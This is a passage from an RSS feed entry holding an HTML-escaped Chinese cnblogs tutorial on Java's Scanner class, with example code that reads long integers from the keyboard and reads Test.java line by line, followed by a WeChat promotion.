        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;System.in代表键盘输入&lt;/span&gt;
        Scanner sc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一个long型整数&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNextLong()){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出输入项&lt;/span&gt;
            System.out.println(&quot;键盘输入的内容是：&quot;+&lt;span&gt;sc.nextLong());    
       }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面程序通过hasNextLong()和nextLong()两个方法可以直接获取输入的Long型整数，如果需要获取其它基本类型的输入项，则可以用相同的方法。&lt;/p&gt;
&lt;p&gt;Scanner除了能读取键盘输入外，还可以读取文件输入。只要在创建Scanner对象时传入一个File对象作为参数即可，例如下面的示例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception{
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Scanner读取文件内容：将一个File对象作为Scanner的构造器参数&lt;/span&gt;
        Scanner sc = &lt;span&gt;new&lt;/span&gt; Scanner(&lt;span&gt;new&lt;/span&gt; File(&quot;Test.java&quot;&lt;span&gt;));
    　　System.out.println(&lt;/span&gt;&quot;Test.java文件内容如下：&quot;&lt;span&gt;);
    　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一行&lt;/span&gt;
    　　&lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNextLine()){
       　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出文件的下一行&lt;/span&gt;
&lt;span&gt;          System.out.println(sc.nextLine());    
    　　}
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面程序因为涉及IO读取，可能引发IO异常，所以程序声明throws Exception表明main方法不处理任何异常。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;欢迎关注微信公众号【Java典籍】，收看更多Java技术干货！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　 &lt;/strong&gt;▼微信扫一扫下图↓↓↓二维码关注&lt;/p&gt;
&lt;p&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1362965/201901/1362965-20190109201610986-215386546.jpg&quot; alt=&quot;&quot; width=&quot;164&quot; height=&quot;164&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:14:00 +0000</pubDate>
<dc:creator>冰湖一角</dc:creator>
<og:description>Scanner类用于获取键盘输入（是一个基于正则表达式的文本扫描器），它可以从文件、字符串、输入流中解析出基本类型值和字符串值。Scanner类提供了多个构造器，不同的构造器可以接收文件、字符串和输入</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bingyimeiling/p/10580447.html</dc:identifier>
</item>
</channel>
</rss>